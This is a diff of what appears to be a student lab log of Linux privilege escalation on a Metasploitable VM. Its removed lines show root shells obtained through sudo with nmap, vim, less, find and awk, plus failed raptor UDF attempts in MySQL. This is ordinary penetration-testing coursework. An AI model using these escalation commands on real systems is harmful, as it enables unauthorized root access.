@@ -314,78 +314,7 @@ firefart@metasploitable:/tmp/equipo4_privesc#
 
 ------------------------------
 
-**🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado**
 
-┌──(kali㉿kali)-[~]
-└─$ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.20
-msfadmin@192.168.100.20's password: 
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-To access official Ubuntu documentation, please visit:
-http://help.ubuntu.com/
-No mail.
-Last login: Fri Nov 14 04:05:38 2025 from 192.168.100.9
-msfadmin@metasploitable:~$ sudo -l
-[sudo] password for msfadmin: 
-User msfadmin may run the following commands on this host:
-    (ALL) ALL
-msfadmin@metasploitable:~$ sudo nmap --interactive
-
-Starting Nmap V. 4.53 ( http://insecure.org )
-Welcome to Interactive Mode -- press h <enter> for help
-nmap> !sh
-sh-3.2# whoami
-root
-sh-3.2# 
-
-
------------------------------
-
-sh-3.2# sudo vim
-
-~
-~
-~
-~
-~
-~                        
-~
-~                         
-~                     
-~           
-~
-~                  
-~          
-~
-~          
-~          
-~          
-~
-~
-~
-~
-~
-:!/bin/bash
-[No write since last change]
-root@metasploitable:/home/msfadmin# sudo less /etc/hosts
-WARNING: terminal is not fully functional
-!/bin/bash  (press RETURN)
-<me/msfadmin# sudo find /home -exec /bin/bash \;   
-
-
-
-<me/msfadmin# sudo awk 'BEGIN {system("/bin/bash")}'             
-root@metasploitable:/home/msfadmin# 
-
-
-------------------------------
 
 root@metasploitable:/home/msfadmin# ls -la /etc/cron.\*
 ls: cannot access /etc/cron.*: No such file or directory
@@ -405,45 +334,6 @@ root@metasploitable:/home/msfadmin# logout
 bash: logout: not login shell: use `exit'
 root@metasploitable:/home/msfadmin# exit
 exit
-root@metasploitable:/home/msfadmin# 
-
-------------------------------
-
-root@metasploitable:/home/msfadmin# mysql -u root
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 7
-Server version: 5.0.51a-3ubuntu5 (Ubuntu)
-
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
-
-mysql> use mysql;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> create table foo(line blob);
-Query OK, 0 rows affected (0.01 sec)
-
-<values(load\_file('/tmp/raptor\_udf2.so'));                     
-ERROR: 
-Unknown command '\_'.
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'load\_file('/tmp/raptor\_udf2.so'))' at line 1
-<values(load\_file('/tmp/raptor\_udf2.so'));                     
-ERROR: 
-Unknown command '\_'.
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'load\_file('/tmp/raptor\_udf2.so'))' at line 1
-<values(load\_file('/tmp/raptor\_udf2.so'));                     
-ERROR: 
-Unknown command '\_'.
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'load\_file('/tmp/raptor\_udf2.so'))' at line 1
-< VALUES ('raptor','i', LOAD_FILE('/tmp/raptor_udf2.so'));        
-ERROR 1048 (23000): Column 'dl' cannot be null
-< VALUES ('raptor','i', LOAD_FILE('/tmp/raptor_udf2.so'));         
-ERROR 1048 (23000): Column 'dl' cannot be null
-mysql> exit 
-Bye
-root@metasploitable:/home/msfadmin# cat /tmp/raptor_udf2.so
-cat: /tmp/raptor_udf2.so: No such file or directory
 root@metasploitable:/home/msfadmin# 
 
 
